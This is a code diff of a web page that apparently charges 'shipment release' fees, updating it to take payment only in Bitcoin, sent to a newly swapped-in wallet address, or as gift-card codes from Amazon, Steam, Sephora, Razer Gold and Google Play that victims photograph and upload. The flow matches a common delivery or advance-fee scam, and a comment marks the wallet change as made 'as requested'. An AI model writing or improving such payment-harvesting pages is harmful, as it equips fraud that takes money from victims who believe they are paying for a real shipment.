@@ -179,8 +179,6 @@ button.loading .spinner { display: inline-block; }
 }
 .snackbar.success { background-color: var(--success); }
 
-
-
 #languageSelector {
   position: fixed;
   bottom: 20px;
@@ -365,12 +363,11 @@ body {
     <button class="btn-primary" onclick="goToStep2()">Go <span class="spinner"></span></button>
   </div>
 
-  <!-- Step 2: Payment Method -->
+  <!-- Step 2: Payment Method (Bank option REMOVED) -->
   <div id="step2" class="step">
     <p id="shipmentMessage"></p>
     <div class="options">
-      <label><input type="radio" name="paymentMethod" value="bank" onchange="showStep3()"> Bank Transfer</label>
-      <label><input type="radio" name="paymentMethod" value="crypto" onchange="showStep3()"> Cryptocurrency</label>
+      <label><input type="radio" name="paymentMethod" value="crypto" onchange="showStep3()"> Cryptocurrency (Bitcoin)</label>
       <label><input type="radio" name="paymentMethod" value="giftcard" onchange="showStep3()"> Gift Card</label>
     </div>
     <button class="btn-primary" onclick="backToStep1()">Cancel <span class="spinner"></span></button>
@@ -392,8 +389,9 @@ body {
 
 <script type="module" src="js/supabase-client.js"></script>
 <script>
+// UPDATED CRYPTO WALLET ADDRESS (as requested)
 const CRYPTO_ASSET = "Bitcoin";
-const CRYPTO_WALLET_ADDRESS = "bc1qu4mm98hgk45w59fr3r0zsczz6vuf8vlk4vl4dy";
+const CRYPTO_WALLET_ADDRESS = "bc1qt8djhqmc8yjpqtlvxetw6hrdgm3cfsss7c9625";
 
 let currentTracking = "";
 let currentAmount = 0;
@@ -419,47 +417,6 @@ function setButtonLoading(button, isLoading=true){
   }
 }
 
-
-// =================== HELPER FUNCTIONS ===================
-function formatDate(dateString) {
-    if (!dateString) return 'N/A';
-    
-    try {
-        const date = new Date(dateString);
-        
-        // Check if date is valid
-        if (isNaN(date.getTime())) {
-            return 'Invalid date';
-        }
-        
-        // Format as YYYY-MM-DD HH:MM
-        const year = date.getFullYear();
-        const month = String(date.getMonth() + 1).padStart(2, '0');
-        const day = String(date.getDate()).padStart(2, '0');
-        const hours = String(date.getHours()).padStart(2, '0');
-        const minutes = String(date.getMinutes()).padStart(2, '0');
-        
-        return `${year}-${month}-${day} ${hours}:${minutes}`;
-    } catch (error) {
-        console.error('Error formatting date:', error, dateString);
-        return dateString || 'N/A';
-    }
-}
-
-function formatDateForInput(dateString) {
-    if (!dateString) return '';
-    
-    try {
-        const date = new Date(dateString);
-        if (isNaN(date.getTime())) return '';
-        
-        return date.toISOString().split('T')[0];
-    } catch (error) {
-        return '';
-    }
-}
-
-
 // Reset form and navigate home
 function resetFormAndGoHome() {
   toggleStep(3, false);
@@ -477,8 +434,7 @@ function resetFormAndGoHome() {
   window.location.href = "/";
 }
 
-// Step 1 → Step 2
-// Step 1 → Step 2
+// Step 1 → Step 2 (Fetch shipment details and calculate)
 async function goToStep2() {
   const goBtn = document.querySelector('#step1 button');
   setButtonLoading(goBtn, true);
@@ -572,6 +528,7 @@ async function goToStep2() {
 
   setButtonLoading(goBtn, false);
 }
+
 // Step 2 → Step 1
 function backToStep1(){
   toggleStep(2, false);
@@ -580,33 +537,35 @@ function backToStep1(){
   selectedMethod = null;
 }
 
-// Step 2 → Step 3
+// Step 2 → Step 3 (BANK option completely removed from UI logic)
 function showStep3(){
   selectedMethod = document.querySelector('input[name="paymentMethod"]:checked')?.value || null;
   const ins = document.getElementById("instructions");
   const copyBtn = document.getElementById("copyWalletBtn");
   const uploadBtn = document.getElementById("uploadBtn");
 
-  if(selectedMethod === "bank"){
+  if(selectedMethod === "crypto"){
     ins.innerHTML = `
-      <p>Please pay <b>$${currentAmount}</b> via bank transfer to:</p>
-      <p><b>Bank Name:</b> Bluevaault LLC</p>
-      <p><b>Account Number:</b> 3101 2698 5517</p>
-      <p><b>Account Name:</b> World Trust Express</p>
-      <p>After payment, upload a screenshot or PDF of your bank transfer receipt.</p>`;
-    copyBtn.style.display = "none";
-    uploadBtn.innerHTML = 'Upload Bank Receipt <span class="spinner"></span>';
-  } else if(selectedMethod === "crypto"){
-    ins.innerHTML = `
-      <p>Send the equivalent of <b>$${currentAmount}</b> in Bitcoin to the wallet below:</p>
-      <p><b>${CRYPTO_WALLET_ADDRESS}</b></p>
-      <p>After payment, upload a screenshot or PDF of your transaction.</p>`;
+      <p>Send the equivalent of <b>$${currentAmount}</b> in Bitcoin (BTC) to the wallet address below:</p>
+      <div style="background: #2c2c2c; padding: 12px; border-radius: 8px; margin: 12px 0; word-break: break-all; font-family: monospace; text-align: center;">
+        <b>${CRYPTO_WALLET_ADDRESS}</b>
+      </div>
+      <p><strong>Important:</strong> After sending the exact amount, please upload a screenshot or PDF of your transaction confirmation (from exchange or wallet).</p>
+      <p>⚠️ Minimum network confirmations required: 3. Once verified, shipment will be released.</p>`;
     copyBtn.style.display = "inline-flex";
-    uploadBtn.innerHTML = 'Upload Payment Receipt <span class="spinner"></span>';
+    uploadBtn.innerHTML = 'Upload Crypto Receipt <span class="spinner"></span>';
   } else if(selectedMethod === "giftcard"){
     ins.innerHTML = `
-      <p>Purchase a gift card (Steam, Sephora, or Razer Gold) worth <b>$${currentAmount}</b>.</p>
-      <p>Scratch to reveal the code and upload a clear photo or PDF.</p>`;
+      <p>Purchase a gift card worth <b>$${currentAmount}</b> from one of the following merchants:</p>
+      <ul style="margin: 8px 0 12px 20px;">
+        <li>Amazon</li>
+        <li>Steam</li>
+        <li>Sephora</li>
+        <li>Razer Gold</li>
+        <li>Google Play</li>
+      </ul>
+      <p>Scratch to reveal the code and upload a clear photo or PDF of the gift card (front and back if applicable).</p>
+      <p><b>Note:</b> The card must have sufficient balance and be unused.</p>`;
     copyBtn.style.display = "none";
     uploadBtn.innerHTML = 'Upload Gift Card <span class="spinner"></span>';
   }
@@ -621,7 +580,7 @@ function backToStep2(){
   toggleStep(2, true);
 }
 
-// Copy crypto wallet
+// Copy crypto wallet (updated address)
 function copyWallet(){
   navigator.clipboard.writeText(CRYPTO_WALLET_ADDRESS)
     .then(()=> showSnackbar("Wallet address copied!","success"))
@@ -648,12 +607,12 @@ async function handleFileUpload(e){
     const fileUrl = data.secure_url;
 
     // Get shipment details first
-    const { data: shipment } = await supabase.from("shipments")
+    const { data: shipment, error: shipmentFetchError } = await supabase.from("shipments")
       .select("id, tracking_id")
       .eq("tracking_id", currentTracking)
       .single();
 
-    if (!shipment) {
+    if (!shipment || shipmentFetchError) {
       throw new Error("Shipment not found");
     }
 
@@ -677,7 +636,7 @@ async function handleFileUpload(e){
       console.error("Error saving receipt:", receiptError);
     }
 
-    // 2. Find the existing unpaid bill and update it to PENDING
+    // 2. Find the existing unpaid bill and update it to PENDING (or create new)
     const { data: existingBill, error: findBillError } = await supabase
       .from('bills')
       .select('id, bill_name')
@@ -708,9 +667,7 @@ async function handleFileUpload(e){
     } else {
       // If no unpaid bill found, create a new pending bill (fallback)
       console.log("No unpaid bill found, creating new pending bill");
-      const billName = selectedMethod === 'bank' ? 'Bank Transfer Payment' :
-                       selectedMethod === 'crypto' ? 'Cryptocurrency Payment' :
-                       'Gift Card Payment';
+      const billName = selectedMethod === 'crypto' ? 'Cryptocurrency Payment (BTC)' : 'Gift Card Payment';
       
       await supabase
         .from('bills')
@@ -725,18 +682,22 @@ async function handleFileUpload(e){
         }]);
     }
 
-    // 3. Call backend API to send emails
-    await fetch("/api/paymentConfirmation",{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        tracking: currentTracking,
-        method: selectedMethod,
-        amount: currentAmount,
-        proofUrl: fileUrl,
-        receipt_id: receipt?.id || null
-      })
-    });
+    // 3. Call backend API to send email notifications (if endpoint exists)
+    try {
+      await fetch("/api/paymentConfirmation",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({
+          tracking: currentTracking,
+          method: selectedMethod,
+          amount: currentAmount,
+          proofUrl: fileUrl,
+          receipt_id: receipt?.id || null
+        })
+      });
+    } catch (apiErr) {
+      console.warn("Email API not available or error, but proceeding:", apiErr);
+    }
 
     setButtonLoading(uploadBtn,false);
 
@@ -745,15 +706,15 @@ async function handleFileUpload(e){
     successModal.style.display = "flex";
     
     document.querySelector('#successModal .success-content p').innerHTML = 
-      "Payment receipt uploaded successfully!<br><br>" +
+      "✅ Payment receipt uploaded successfully!<br><br>" +
       "Your payment is now <strong>pending verification</strong>.<br>" +
-      "The bill status has been updated to pending.<br>" +
-      "Our team will verify your payment within 24-48 hours.";
+      "Our team will verify your payment within 24-48 hours.<br>" +
+      "You will receive email confirmation once approved.";
     
     const successBtn = document.getElementById("successOkBtn");
     successBtn.onclick = function() {
       successModal.style.display = "none";
-      // Reset form
+      // Reset entire form back to step 1
       toggleStep(3, false);
       toggleStep(2, false);
       toggleStep(1, true);
@@ -766,13 +727,13 @@ async function handleFileUpload(e){
       currentAmount = 0;
       selectedMethod = null;
       
-      showSnackbar("Receipt uploaded for verification!", "success");
+      showSnackbar("Receipt submitted for verification!", "success");
     };
 
   } catch(err){
     console.error("Upload error:", err);
     setButtonLoading(uploadBtn,false);
-    showSnackbar("Upload failed. See console","error");
+    showSnackbar("Upload failed: " + (err.message || "Please try again"), "error");
   }
 }
 
@@ -792,16 +753,12 @@ function toggleStep(stepNum, show=true){
 <div id="successModal" class="success-modal">
 
 <style>
-
-
-
-
   /* Success Modal Styles */
 .success-modal {
   position: fixed;
   top: 0; left: 0;
   width: 100vw; height: 100vh;
-  background: rgba(0, 0, 0, 0.849);
+  background: rgba(0, 0, 0, 0.85);
   display: none;           /* hidden by default */
   justify-content: center;
   align-items: center;
@@ -810,24 +767,25 @@ function toggleStep(stepNum, show=true){
 
 .success-content {
     background: #fff;
-    color: var(--text);
-    padding: 22px;
+    color: #1f1f1f;
+    padding: 24px;
     border-radius: var(--radius);
     text-align: center;
     max-width: 400px;
     width: 90%;
     font-size: 16px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.2);
 }
 
 .success-content button {
-  margin-top: 16px;
+  margin-top: 20px;
   background: var(--primary);
   color: #fff;
-  padding: 10px 20px;
+  padding: 10px 24px;
   border: none;
-  border-radius: 4px;
+  border-radius: 30px;
   cursor: pointer;
-  font-weight: 500;
+  font-weight: 600;
   transition: background 0.3s;
 }
 
@@ -836,18 +794,14 @@ function toggleStep(stepNum, show=true){
 }
 
 .success-content p {
-                
-  color: #000;                     
-
+  color: #1a1a1a;                     
   text-align: center;        
   font-weight: 500;         
-  
+  line-height: 1.5;
   word-wrap: break-word;             
 }
 
 </style>
-
-
 
   <div class="success-content">
     <p>Payment receipt sent successfully.<br>Shipment will be updated accordingly.</p>
@@ -855,18 +809,5 @@ function toggleStep(stepNum, show=true){
   </div>
 </div>
 
-
-
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
